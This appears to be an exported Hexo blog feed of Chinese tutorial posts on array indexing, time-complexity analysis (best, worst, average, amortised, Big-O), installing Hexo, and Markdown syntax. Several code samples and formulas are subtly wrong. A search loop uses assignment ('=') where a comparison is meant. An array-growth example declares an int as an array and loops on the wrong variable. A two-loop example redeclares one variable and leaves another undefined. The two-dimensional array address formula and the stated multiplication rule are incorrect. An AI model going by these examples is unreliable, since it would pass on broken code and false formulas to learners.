    <content type="text"><![CDATA[前言 提到数组，我想你肯定不陌生，甚至还会自信的说他很简单。 是的，在每一种编程语言中，基本都会有数组这种数据类型。尽管数组看起来非常基础、简单，但是我估计很多人都没有理解这个基础数据结构的精髓。 在大部分的数据结构中，数组都是从0开始编号的，但是为什么数组要从0开始，而不是1开始呢？从1开始不是更符合人类的思维习惯吗？下面我们通过本篇文章来认识这个问题。 数组如何实现随机访问？ 什么是数组呢？数组是一种线性表结构，它用一组连续的内存空间，来存储一组具有相同数据类型的数据。 这里有几个关键词： 第一是线性表。顾名思义，线性表就是数据像一条线一样的结构。每个线性表上的数据最多只有前后两个方向。除了数组，链表、队列、栈等也是线性表结构。 与线性表相对应的概念是非线性表，比如二叉树、堆、图，之所以叫非线性，是因为在非线性表中，数据之间并不是简单的前后关系。 第二个是连续的内存空间和相同类型的数据。正是因为这两个限制，所以才有一个堪称杀手锏的特性：“随机访问”。但有利就有弊，这两个限制也让数组的很多操作变得非常低效，比如在数组中插入、删除一个数据，为了保证连续性，就需要做大量的数据搬移工作。 说到数据的随机访问，那么数组是如何实现很具下标随机访问数组元素的吗？ 我们拿一个长度为10的int类型的数组int[] a = new int[10] 来举例。在如下图中，假设计算机给数组a[10] 分配了一块连续的内存空间000-039，其中首地址为000。 我们知道计算机会给每个内存单元分配一个地址，计算机通过地址来访问内存中的数据。当计算机需要随机访问某个数组元素时，它会通过寻址公式，计算出该元素的内存地址。 $$ a[i]\_address = base\_address + i * data\_type\_size $$ 其中base address表示数组的基地址，data_type_size表示数组中的每个元素的大小，在这个例子中，数组中存储的int类型，所以data_type_size就是4个字节。 很多人在面试中回答数组和链表的区别都会这么说：“链表适合插入、删除，时间复杂度为 O(1)；数组适合查找，查找时间复杂度为O(1)”。实际上这种表述是不准确的。数组是适合查找操作，但是查找的复杂度并不是O(1)，即便是排好序的数组，用二分查找时间复杂度也是$O(logN)$。所以正确的表述应该是数组的随机访问的复杂度是O(1)。 低效的“插入”和“删除”前面我们提到，数组为了保持内存数据的连续性，会导致插入、删除操作比较低效，现在我们就来看看究竟为什么会导致低效？ 插入操作假设数组的长度为n，现在需要将一个数据插入到数组中的第k个位置。为了把第k个位置腾出来，我们需要将k-n这部分的元素都往后顺挪一位。 如果是在数组的末尾插入元素，那就不需要移动数据，时间复杂度为O(1)；但是如果在数组开头插入一个元素，那所有的元素都需要后移一位，所以最坏时间复杂度为O(n)；因为在每个位置插入元素的概率是一样的，所以平均时间复杂度为$ (1+2+3+…+n)/n = O(n) $ 。 所以对于插入的时间复杂度：最好的O(1)，最坏O(n)，平均O(n)。 如果数组中的元素是有序的，并且插入新元素也要保证数组有序，那么就必须按照刚才的方法移动数据。但是如果数组中存储的数据没有任何规律，只是被当来存储数据的集合，那么如果在k处插入一个数据，可以将k处的数据移到数组的末尾，然后替换k处数据为要插入的数据，这种插入处理技巧可以将时间复杂度降为O(1)。 删除操作跟插入数据类似，如果要删除第k个位置的数据，为了保持内存的连续性，也需要搬迁数据，不然数组中间就会出现断层，内存就不连续了。 和插入类似，如果删除数组末尾的数据，则是最好时间复杂度为O(1)；如果删除开头的数据，则最坏时间复杂度为O(n)，平均情况时间复杂度也为O(n)。 实际上，在某些特殊场景下，我们并不一定追求数组中数据的连续性，如果我们将多次删除操作集中在一起执行，删除的效率是不是会提高很多呢？ 我们继续来看一个例子，数组a[10]中存储了8个元素：a,b,c,d,e,f,g,h。现在我们要依次删除a,b,c这三个元素。 为了避免d,e,f,g这几个数据会被搬移三次，我们可以先记录下已删除的数据，每次的删除并不是真正的搬移数据，只是记录数据已经被删除，当数组没有更多空间存储数据事，我们再进行一次真正的删除操作，这样就大大减少了删除数据之后导致的数据迁移。 如果你了解JVM，会发现，这不就是JVM的标记清除垃圾回收算法的核心思想吗？没错，数据结构和算法的魅力就在于此，很多时候我们并不是要去死记硬背某个数据结构或算法，而是要学习他背后的思想和处理技巧，这些东西才是最优价值的。如果你细心留意，不管是在开发还是在架构设计中，总能找到某些数据结构和算法的影子。 警惕数组越界问题了解数组的几个基本操作后，再来看看数据的访问越界问题。 这里以一段C语言代码为例来进行说明： 123456789int main(int argc, char* argv[])&#123; int i = 0; int arr[3] = &#123;0&#125;; for(i; i&lt;=3; i++)&#123; arr[i] = 0; printf("hello world\n"); &#125; return 0;&#125; 你发现问题了吗？这段代码并不是打印三行”hello world”，而是会无限打印”hello world”，这是为什么呢？ 我们知道数组大小为3，分别为a[0]、a[1]、a[2]，而我们代码因为书写错误，for循环结束条件错写为了i&lt;=3而非i&lt;3，所以当i=3时，数组访问越界。 我们知道，在C语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。而根据我们前面讲的寻址公式，a[3]也会被定位到一个某块不属于数组的内存地址上，而在C语言的内存管理中，在局部变量分配空间的顺序是跟变量的声明顺序直接相关，同时按照内存由高到低的顺序进行空间分配，所以在内存布局中，i变量的地址刚好是在数组arr之后的一个字，所以在循环体中，将arr[3]赋值为0，实际上却是将计数器i的值设为0，这就导致了该函数的死循环。 关于C语言中编译器关于变量的内存分配顺序可以看此篇文章理解一下: https://blog.csdn.net/liuhuiyi/article/details/7526889 数组越界在C语言中是一种未决行为，并没有规定数组访问越界编译器应该如何处理。因为数组访问的本质就是访问一段连续的内存地址，只要数组通过偏移计算得到的内存地址是可用的，那么程序就不会报错。 所以在这种情况下，一般会出现莫名其妙的错误，而且很多计算机病毒也是利用了代码中数组越界可以访问到非法地址的漏洞，来攻击系统，所以代码中一定要警惕数组的越界访问。 但并非所有的编程语言都想C一样，将数组越界检查交给程序员来做，像Java、Python本身就会做越界检查，比如java会抛出java.lang.ArrayIndexOutOfBoundsException的异常，Python会有IndexError: list index out of range的错误。 容器能否完全代替数组?针对数组类型，很多语言提供了容器类。比如在java中提供了ArrayList、C++ STL中的vector等。那么在项目开发中，什么时候适合用数组，什么时候适合用容器呢？ 以java中ArrayList为例，ArrayList最大的优势就是可以将很多数组操作封装，比如数组的插入、删除等。另外，它还支持动态扩容，当存储空间不够时，它会自动扩容为原来的1.5倍。 不过由于扩容操作涉及内存申请和数据搬移，是比较耗时的，因此如果事先能确定存储数据的大小，最好在创建ArrayList时实现指定数据的大小。 作为高级语言编程者，是不是数组就无用武之地了呢？当然不是，有时候用数组会更合适些。 1、Java ArrayList无法存储基本类型，需要封装为Long、Integer等包装类类型，因此存在一定的拆装箱上的性能损耗，如果特别关注性能，或者要使用基本类型，则可以选择数组。 2、如果事先知道数据的大小，并且对数据的操作非常简单，用不到ArrayList提供的大部分方法，也可以使用数组。 对于业务开发，直接使用容器就足够了，省时省力，毕竟一丢丢的性能损耗，不会影响到系统整体的性能，但是如果做一些非常底层的开发，这个时候数组就会优于容器，成为首选。 解答开篇为什么数组的索引是从0开始，而不是从1开始呢？ 从数组存储的内存模型来看，”下标”即索引最确切的定义应该是”偏移(offset)”，如果用arr表示数组的首地址，a[0]就是偏移为0的位置，也就是首地址，a[k]表示偏移k个type_size的位置，所以计算a[k]的内存地址只需要根据如下公式计算即可$$ a[k]\_address = base\_address + k * type\_size $$ 但是如果数组从1开始计数，那我们计算a[k]的内存地址计算公式就会变为：$$ a[k]\_address = base\_address + (k-1) * type\_size $$ 对比两个公式，从1开始的话，每次随机访问数组元素就多了一次减法指令。数组作为非常基础的数据结构，通过下标随机访问数组元素又是非常基础的操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作指令，数组选择了从小标从0开始，而不是从1开始。 不过解释的再多，我认为都算不上压倒性的证明，说数组编号非从0开始不可，最主要的原因可能是历史原因。 C语言设计者用0开始计数数组下标之后，Java、JavaScript等高级语言都效仿了C语言，或者说为了在一定程度上减少C语言程序学习Java的成本，继续沿用了从0开始计数的习惯。但是仍有很多语言中数组并不是从0开始的，比如Matlab。甚至还有一些语言支持负数下标，比如python。 思考题1、在数组的删除操作中，提到了JVM的标记清除垃圾回收算法的核心理念，如果熟悉Java、JVM，回顾下JVM的标记清除垃圾回收算法。2、上面讲到一维数组的寻址公式，类比一下，二维数组的内存寻址公式是怎么样的？ JVM标记清除垃圾回收算法：分为两个阶段，标记和清除。在大多数主流的虚拟机中采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有GC ROOTS，将所有GC ROOTS可达对象标记为存活，只有当标记工作完成后，才会进行清理工作。 该算法最大的问题是会产生连续的内存空间碎片，同时标记和回收的效率都不高，但是对于只有少量垃圾产生时可以采用此种算法。 二维数组的寻址公式： 根据上图,对于一个二维数组int arr[m][n]，arr[i][j]的寻址公式为：$$ arr[i][j]\_address = base\_address + (i + n*j)*data\_type\_size $$ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-最好、最坏、平均、均摊时间复杂度]]></title>
    <url>%2Fposts%2F2018-09-09-%E7%AE%97%E6%B3%95-%E6%9C%80%E5%A5%BD%E3%80%81%E6%9C%80%E5%9D%8F%E3%80%81%E5%B9%B3%E5%9D%87%E3%80%81%E5%9D%87%E6%91%8A%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6.html</url>
    <content type="text"><![CDATA[前言 前面我们讲过复杂度的大O表示法和几个分析技巧，还举了一些复杂度分析的例子，掌握了这些内容，对于复杂度分析这个知识点，已经达到及格线了。 这篇会着重讲一下复杂度分析的四个复杂度分析方面的知识： 最好时间情况复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度。 最好、最坏时间复杂度 我们先用学过的知识试着分析以下代码的时间复杂度： 1234567891011int findArray(int[] arr, int n, int target)&#123; int i = 0; int pos = -1; for(i; i&lt;n; i++)&#123; if(arr[i] = target)&#123; pos = i; &#125; &#125; return pos;&#125; 上面代码实现的功能是在一个无序数组中，查找变量target的位置，如果找不到就返回-1，按照前面的分析方法，该段代码的时间复杂度为O(n)。 但是我们在数组中查找一个数据，并不需要每次都把整个数组都遍历一遍，优化一下这段代码： 123456789101112int findArray(int[] arr, int n, int target)&#123; int i = 0; int pos = -1; for(i; i&lt;n; i++)&#123; if(arr[i] = target)&#123; pos = i; break; &#125; &#125; return pos;&#125; 但是这时候问题来了，优化完之后，时间复杂度还是O(n)吗？ 因为要查找的变量target可能出现在数组的任何位置，如果要查找的target刚好出现在数组的开始位置，那么就不需要遍历剩余的数据，此时时间复杂度为O(1)。但是如果数组中不存在变量target，或者在最后一位，那我们就需要把整个数组都遍历一遍，时间复杂度就成了O(n)，所以这段代码在不同情况下时间复杂度是不同的。 为了表示代码在不同情况下的时间复杂度，我们需要引入三个概念：最好情况时间复杂度、最坏情况复杂度、平均时间复杂度。 顾名思义，最好情况时间复杂度就是，在最理想情况下，执行这段代码的时间复杂度。如上例中，在最理想情况下，查找的变量target刚好在第一个，这时候对应的时间复杂度就是最好情况时间复杂度。 同理，最坏情况时间复杂度就是，在最糟糕的情况下，执行这段代码的时间复杂度，上例中，如果数组中没有要查找的变量target，我们需要把整个数组遍历一遍，所以最坏情况下对应的时间复杂度就是最坏情况复杂度。 平均时间复杂度我们都知道，最好情况时间复杂度和最坏情况时间复杂度对应的都是极端情况下的代码复杂度，发生的概率并不大。为了更好的表示平均情况下的时间复杂度，我们引入一个概念：平均情况时间复杂度，简称平均时间复杂度。 平均时间复杂度又该怎么分析呢？我们还是借助上面的例子。 要查找的变量target在数组中的位置，有n+1中情况： 在数组0 ~ n-1位置 n种情况和不在数组中1个情况。我们把每种情况下，需要遍历的元素个数累加起来，然后在除以n+1，就可以得到需要遍历的元素个数的平均值，即： $$ \frac{1+2+3+…+n+n}{n+1} = \frac{n(n + 3)}{2(n + 1)} $$ 我们知道，时间复杂度大O标记法中，可以省略掉系数、低阶、常量，所以上面的时间复杂度为O(n)。 这个结论虽然是正确的，但是计算过程稍微有点问题。我们刚讲的这n+1中情况，出现的概率并不一样。下面结合概率论的知识分析一下。 我们知道，要查找的变量x，要么在数组中，要么不再数组中，我们假设这两个概率分布为$\frac{1}{2}$。 不在数组中时，时间复杂度为: $n\times\frac{1}{2}$; 在数组中时，因为数组大小为n，出现在任何一个位置的可能性都是一样的，所以每个位置的概率就是:$\frac{1}{2n}$, 因此在数组中时的时间复杂度为：$(1+2+3+…+n)\times\frac{1}{2n} $。 那平均时间复杂度就是：$(1+2+3+…+n)\times\frac{1}{2n} + n\times\frac{1}{2} = \frac{3n+1}{4} = O(n)$。 这个值就是概率论中的加权平均值，也叫做期望值，所以平均时间复杂度也叫做加权平均时间复杂度或者期望时间复杂度。 实际上，在大多情况下我们并不需要区分最好、最坏、平均时间复杂度三种情况，很多时候我们只用一个复杂度就可以满足需求了。只有同一代码在不同的情况下，时间复杂度有量级的差距，我们才会使用三种复杂度表示法来区分。 均摊时间复杂度目前为止，我们应该已经掌握了算法复杂度分析的大部分内容了，下面来认识一个更高级的概念：均摊时间复杂度，以及它对应的分析方法摊还分析。 均摊时间复杂度听起来跟平均时间复杂度有点像，对于初学者来说，这两个概念很容易弄混。前面说过，大部分情况下不需要区分最好、最坏、平均时间复杂度，只有某些特殊情况才需要平均时间复杂度，而均摊时间复杂度比它的应用场景比它更特殊、更有限。 还是以一个例子来说明(别太在意例子，只是为了说明)： 1234567891011121314151617int[] arr = new int[n];int size = 0；void insert(int val)&#123; // 如果数组满了 if(count == arr.length)&#123; int sum = 0; for(int i=0; i&lt;arr.length;i++)&#123; sum = sum + arr[i]; &#125; arr[0] = sum; count = 1; &#125; // 数组赋值 arr[count] = val; ++count;&#125; 先简单解释一下这段代码的功能，这段代码实现了一个往数组中插入数据的功能，如果数组有空闲空间，直接插入即可。如果数组满了，将数组中的数据求和，清空数组，将求和之后的数据放入数组的第一个位置，然后再将新的数据插入。 那这段代码的时间复杂度是多少呢？我们可以先利用上面讲的三种分析方法来分析一下。 最理想情况下，数组有空闲空间，直接插入数据就可以，所以最好时间复杂度为O(1)；最坏情况下，数组中没有空闲空间了，我们需要先进行一次数组遍历求和，在做数据插入，所以最坏情况时间复杂度为O(n)；平均情况时间复杂度，我们还是用概率论的方法来分析，假设数组长度为n，根据插入位置不同，可以分为n种情况，每种情况的时间复杂度为O(1)，另外还有一种特殊情况，就是数组没有空闲时间时，时间复杂度为O(n)，而且这n+1中情况出现的概率是一样的，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} +….+ 1\times\frac{1}{n+1} + n\times\frac{1}{n+1} = O(1) $。 我们来比较一下这个例子中insert函数和上面findArray的不同。首先，findArray在极端情况下，复杂度才为O(1)，大部分情况都为O(n)，而insert函数大部分情况时间复杂度都为O(1)，只有特殊情况时间复杂度才为O(n)，这是第一个区别。第二个不同的地方，对于insert函数来说，O(1)和O(n)的时间复杂度出现的频率是非常有规律的，而且有一定的时序关系，一般都是一个O(n)插入之后，跟n-1个O(1)的插入操作，循环往复。 针对这样一种情况，我们并不需要像平均复杂度分析那样，计算所有输入情况和发生的概率，计算加权平均值。 我们引入一种更加简单的分析方法：摊还分析法，通过摊还分析得到的时间复杂度我们起了一个名字叫：摊还时间复杂度。 那么究竟如何使用摊还分析法来分析算法的均摊时间复杂度呢？ 我们还是以这个insert函数为例，每一次O(n)的插入操作，后面都会跟n-1次O(1)插入操作，所以我们把耗时最多的操作均摊到n-1次耗时少的操作上，均摊下来，这一组连续操作的均摊时间复杂度就为O(1)，这就是均摊分析法的大致思路。 均摊时间复杂度和摊还分析应用场景比较特殊，所以不会经常用到，这里简单总结一下他们的应用场景。 对一个数据结构进行一组连续操作中，大部分情况下时间复杂度都很低，只有个别情况下时间复杂度比较高，而且这些操作之间存在前后连贯的时序关系，这个时候，我们就可以将这一组操作放在一块分析，看看是否能将时间复杂度高的操作，均摊到其他时间复杂度低的操作上。在一般的能运用均摊时间复杂度的场景中，均摊时间复杂度是等于最好时间复杂度的。 思考题：根据今天学习的几个复杂度分析的方法，来分析一下下面这个add()函数的时间复杂度。 1234567891011121314151617181920int[] arr = new int[10];int len = 10;int i=0;void add(int element)&#123; // 数组空间满了 if(i&gt;=len)&#123; // 数组扩容 int new_arr = new int[len*2]; // 把数组拷贝到新数组 for(int j=0; i&lt;len; j++)&#123; new_arr[j] = arr[j]; &#125; arr = new_arr; len = len*2; &#125; // 添加到数组中 arr[i] = element; ++i;&#125; 分析：在最理想情况下，数组中有空闲空间，可以直接添加到数组中，时间复杂度为O(1)；最坏情况下，数组中没有空闲空间，先进行一次扩容操作，在进行遍历给新数组赋值，时间复杂度为O(n)，所以最坏时间复杂度为O(n)。 平均时间复杂度，可以分为有空闲空间和没有空闲空间两种，有空间空间有n中情况，所以每种情况出现的概率为$\frac{1}{n+1}$，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} +….+ 1\times\frac{1}{n+1} + n\times\frac{1}{n+1} = O(1) $。 均摊时间复杂度，可以看出本例是符合均摊时间复杂度的场景的，在一次O(n)时间复杂度操作后都会跟n-1次O(1)时间复杂度操作，所以将O(n)时间复杂度的操作均摊到n-1次O(1)时间复杂度操作上，最终均摊时间复杂度为O(1)。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>复杂度分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-复杂度分析]]></title>
    <url>%2Fposts%2F2018-09-08-%E7%AE%97%E6%B3%95-%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90.html</url>
    <content type="text"><![CDATA[前言 我们都知道，数据结构和算法本身解决的是“快”和“省”的问题，即如何让代码运行的更快、更省存储空间。那如何来衡量算法的“快”和“省”呢？这就要用到复杂度分析：时间、空间复杂度分析。复杂度分析是整个算法学习的精髓，掌握了它，数据结构和算法的内容基本就掌握了一半。 为什么需要复杂度分析 有人说，我只要把代码跑一遍，通过统计、监控，就可以得到算法执行的时间和占用的那内存，为什么还要做复杂度分析呢？ 1、首先，这种评估方法确实是准确的，但是这种方法是”事后统计法”，是有非常大的局限性。 2、测试结果非常依赖测试环境，同样一段代码，在不同的CPU可能执行的时间会差很多，比如Intel Core i9就比i3运行的快，同样在不同的两台机器上也可能会出现代码执行不一样的情况。 3、对于不同的数据集，如果数据的有序程度不一样，那么对数据进行同一种算法运算，也可能会得到不同的结果。除此之外，数据规模的大小也可能对算法产生影响。 因此我们需要一个不用具体的测试数据来测试，就可以粗略估计算法的执行效率的方法，这就是时间、空间复杂度分析所解决的问题。 大O复杂度表示法 算法的执行效率，粗略的讲，就是算法执行的时间，但是如何能在不运行的情况下，得到一段代码的运行时间呢？ 这里举一个简单的例子，求解1，2，3……n 的累加和，以下为一个简单的代码实现： 1234567int sum(int n)&#123; int sum = 0; for (int i=1; i&lt;=n; i++)&#123; sum += i; &#125; return sum;&#125; 从CPU的角度看，每一行代码都执行着类似的操作：读数据-运算-写数据。尽管每行代码对应的CPU执行个数、执行时间都不尽相同，但是我们只是粗略的估计，因此这里假设每行代码执行的时间都相同，那么在此基础上，这段代码执行的时间可以进行如下计算： 第二行代码执行时间为time，第三、四行代码执行的时间为 $ 2 \times n \times time $，所以此段代码执行的时间为$ (2n + 1)\times time $ ，可以看出这段代码执行时间T(n)与每行代码的执行次数成正比。 按照这个思路，再对以下代码段进行分析： 12345678int sum(int n)&#123; int sum = 0; for(int i=1; i &lt;= n; i++)&#123; for(int j=1; j &lt;= n; j++)&#123; sum += i*j; &#125; &#125;&#125; 假设每行代码执行的时间依然为time，那么这段代码执行的时间是多少呢？ 第二行代码的执行时间依然为time，第三行代码执行的次数为n次，所以需要的时间为$ n*time $,内层循环第四、五行代码都执行了$ n*n $次,需要的时间为$ 2*n^2*time $。所以此段代码总的执行时间为$(n + 1 + 2n^2)*time $。 尽管不知道time的具体值，但是通过这两段代码的分析过程，得出一个非常重要的规律： 所有的代码执行时间T(n)与每行代码的执行次数成正比$$ T(n) = O(f(n)) $$ 其中 $T(n)$ 表示代码执行的时间; n表示数据规模大小; $ f(n) $ 表示每行代码执行次数的总和，因为是一个公式，所以用$ f(n) $ 表示。公式中的O表示代码执行时间 $ T(n) $ 与 $ f(n) $ 成正比。 所以在第一个例子中 $ T(n) = O(2n + 1) $ ，第二个例子中 $ T(n) = O(2n^2 + n + 1)$ , 这就是大O时间复杂度表示法。大O时间复杂度实际上并不具体表示代码真正执行的时间，而是表示代码执行时间随数据规模增长的变化趋势，所以也叫做渐进时间复杂度，简称时间复杂度。 在时间复杂度公式中，如果n很大时，公式中的低阶、常量、系数三部分并不影响增长趋势，所以可以先忽略。所以上述两个例子的时间复杂度就可以记为： $ T(n) = O(n) $； $ T(n) = O(n^2) $; 时间复杂度分析 前面介绍了大 O 时间复杂度的由来和表示方法，那如何分析一段代码的时间复杂度呢？ 1、只关注循环次数最多的一段代码在大 O 表示法中，只是表示一种趋势，通常我们会忽略公式中的常量、低阶、系数，因此只需要记录一个最大的量级就可以了，所以我们在分析一个算法时，只关注循环次数执行次数最多的那一段代码就行了。 2、加法法则：总复杂度等于量级最大的那段代码的复杂度如果一段代码中出现多个循环，那么总的时间复杂度就是各个循环相加得到的，但是往往会忽略低阶、常量，因此只取量级最大的那段代码就可以了。 注意：当一段代码循环次数是一个常量，比如循环10000、1000000次，只要是一个已知的常量数，且不随数据规模变化，那么该循环照样是一个常量级别的执行时间。 3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积比如第二个例子中如果但看外层循环的时间复杂度是 $ O(n) $；内层循环的时间复杂度也是 $O(n)$， 因此总共的时间复杂度就是 $ T(n) = O(n) * O(n) = O(n^2) $ 几种常见时间复杂度 1、$O(1)$O(1) 只是常量级时间复杂度的一种表示方法，并不是指执行了一行代码。只要代码的执行时间不随n的增大而增大，这样的代码时间复杂度都可以记为O(1)。一般情况下，只要代码中不出现循环、递归等，即使有成千上万行代码，时间复杂度也是O(1)。 2、$ O(logN)、O(N*logN) $对数阶的时间复杂度非常常见，同时也是最难分析的一种。 1234int i = 1;while(i &lt;= n)&#123; i = i * 2;&#125; 在上述代码中，变量i从1取值，第二次为2，第三次为4，第四次为8……,所以i的取值规律为 $$ 2^0 \&nbsp;&nbsp;&nbsp;&nbsp; 2^1 \&nbsp;&nbsp; 2^2 \&nbsp;&nbsp; 2^3 … 2^k… 2^x $$ 当$2^x = n$ 时，循环结束，而循环的次数即为x，所以时间复杂度也为$ O(x=\log_2 N) $。 如果把代码改为如下。那时间复杂度是多少呢？ 1234int i = 1;while(i &lt;= n)&#123; i = i * 3;&#125; 根据上面的思路，很容易看出这段代码的时间复杂度为$ O(log_3N) $ 。 实际上，不管是以2为底，还是以3为底，亦或是以10为底，我们都把对数阶的时间复杂度记为$ O(logN) $，为什么呢？ 我们知道对数之间是可以互相转化的，$ log_3n$ 就可以转换为$ log_32*log_2N $，所以$ O(log_32) = O(C * log_2N) $，其中$ C = log_32 $ 是一个常量，基于前面的结论： 在采用大O标记复杂度的时候，可以忽略系数，即$ O(C*f(n)) = O(f(n)) $。因此在对数阶时间复杂度的表示方法里，我们忽略的底，统一表示为$O(logN)$。 如果理解了$O(logN)$，那么$O(nlogN)$就很容易了，根据前面所说的乘法法则，如果一段代码的时间复杂度是$O(logN)$，如果循环执行了 n 次，那么该代码的时间复杂度就是$O(nlogN)$。而且$O(nlogN)$是一种非常常见的时间复杂度，归并排序、快速排序的时间复杂度都是$O(nlogN)$。 2、$ O(m+n)、O(m*n) $我们再来讲跟前面都不一样的时间复杂度，代码的时间复杂度由两个数据规模来决定。 123456789101112int func(int m, int n)&#123; int sum1 = 0; for(int i=1; i&lt;=m; i++)&#123; sum1 += i; &#125; int sum1 = 0; for(int j=1; j&lt;=m; j++)&#123; sum1 += j; &#125; return sum1+sum2;&#125; 从代码中看出，m和n表示两个不同的数据规模，我们无法事先评估m和n的量级大小，所以我们在分析复杂度时，就不能简单用加法法则忽略一个，因此上面代码的时间复杂度为$O(m + n)$， 针对这种情况，加法原则就不正确了，我们将加法原则改为：$ T1(m) + T2(n) = O(f(m) + g(n)) $，但是乘法法则继续有效：$ T1(m) + T2(n) = O(f(m) * f(n)) $。 空间复杂度 前面讲过，时间复杂度的全称是渐近时间复杂度，表示算法的执行时间与数据规模之间的增长关系。类比一下，空间复杂度的全称就是渐进空间复杂度，表示算法的存储空间与数据规模的增长关系。 还是拿具体的例子说明(仅供测试,一般没人这么写) 12345678void func(int n)&#123; int i = 0; int[] a = new int[n]; for(i; i&lt;n; i++)&#123; a[i] = i*1; print(a[i]); &#125;&#125; 和分析时间复杂度一样，我们看到第二行申请了一个空间变量i，但是它是常量阶的，跟数据规模n无关，所以可以忽略，第三行申请了一个大小为n的int数组，除此之外，该代码没有占据更多的空间O(n). 我们常见的空间复杂度就是$O(1)、O(n)、O(n^2)$，像$ O(logN)、O(nlogN) $ 这样的对数阶复杂度平时都用不到。空间复杂度分析相对时间复杂度要简单得多。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>复杂度分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo-安装及配置]]></title>
    <url>%2Fposts%2F2018-09-07-hexo-%E5%AE%89%E8%A3%85%E5%8F%8A%E9%85%8D%E7%BD%AE.html</url>
    <content type="text"><![CDATA[前言曾几何时，你是否也想有个自己的博客，抒发自己的心情，总结自己的得失，与人分享喜悦、哀伤、愤怒、忧愁，那么这篇文章你就必须看了，非常简单搭建一个自己的开源博客。 一、预备1、安装Nodejs及npm Nodejs下载地址： 官网下载地址：https://nodejs.org/zh-cn/download/ 2、安装Git Git下载地址： 官网下载地址：https://git-scm.com/download/ 安装完成后，执行如下命令，可以显示版本号就算安装成功了 12345678$ node -vv9.11.1$ npm -v6.3.0$ git --versiongit version 2.17.0.windows.1 二、安装hexo进入命令行，执行如下命令: 1234567891011121、全局安装hexo$ npm install hexo -g2、创建hexo工作目录$ mkdir hexo-blog$ cd hexo-blog3、初始化工作目录$ hexo init4、本地启动hexo$ hexo serve 到此一个hexo博客已经搭建完成了，可以访问 http://localhost:4000/ 查看博客的效果。 当然现在你就可以开始写博客了，默认的配置足够你写作、发表文章了，但是默认的东西有些并不符合自己的要求和审美。所以下面对hexo进行一些配置，以符合自己的要求。 三、hexo配置hexo的配置文件在根目录下_config.yml文件中。本文仅列举几项，其余配置可以参照hexo官网文档进行配置，当然，有兴趣可以参照我的配置 网站配置：12345678# Sitetitle: Aries' blog 网站标题subtitle: 副标题description: 我不生产知识，我只是知识的搬运工。 网站一句话描述keywords: 关键词author: 无名万物 作者language: zh-CN 语言timezone: Asia/Shanghai 时区 文章配置：1234url: http://blog.renhj.org 网站urlroot: / 文章根路径permalink: posts/:year-:month-:day-:title.html 文章urlpermalink_defaults: 四、创建新文章你可以通过以下命令来创建一篇新文章1hexo new [layout] &lt;title&gt; 命令中指令文章的布局，默认为post，可以通过修改_config.yml中的default_layout来修改默认布局，当然也可以在文章Front-Matter上添加布局. 当然也可以新建一个草稿： draft，这种布局在建立时会保存到source/_drafts文件夹，也可以通过publish来将草稿移动到正式文件夹。 12345# 新建草稿文章$ hexo new draft &lt;title&gt;# 将文章正式发布$ hexo publish [layout] &lt;title&gt; Front-matter Front-matter是文章最上方以--- 分割的区域，用于指定个别文件的变量 12345678910---layout: 指定文章的布局属性title： 文章标题data：建立日期updated： 更新日期comments： 是否开启文章的评论功能(如果有的话)tags： 标签categories：分类permalink： 覆盖文章的网址--- 修改美化默认的主题是有点丑，可以去hexo的主题商店 找一个自己喜欢的、漂亮的主题。 本人找的是网上比较流行的nexT的主题，即本博客所使用的主题：hexo nexT主题，更多的配置可以参照nexT官网的配置或者其他文章进行配置。本文就不再这里赘述的，具体效果可以看本博客的。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>博客</tag>
        <tag>nexT</tag>
        <tag>Github Pages</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Markdown来写文章]]></title>
    <url>%2Fposts%2F2018-09-06-%E7%94%A8Markdown%E6%9D%A5%E5%86%99%E6%96%87%E7%AB%A0.html</url>
    <content type="text"><![CDATA[MarkdownMarkdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成丰富的HTML页面。 Markdown用一些简单的符号标识不同的标题，将某些文章标记为”粗体“或者斜体，下面就来一起学习一下。 语法1、标题 不同的标题采用不等个数的#号来进行标记，如下所示： 1234# 一级标题## 二级标题### 三级标题#### 四级标题 2、代码块 在需要高亮的代码块的前一行及后一行使用三个反引号“`”，同时第一行反引号后面表面代码块所使用的语言, 如下： ```pyhtonprint (“Hello World!”)``` 3、特殊字符 123**粗体***斜体*&gt; 引用内容 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>博客</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
</search>
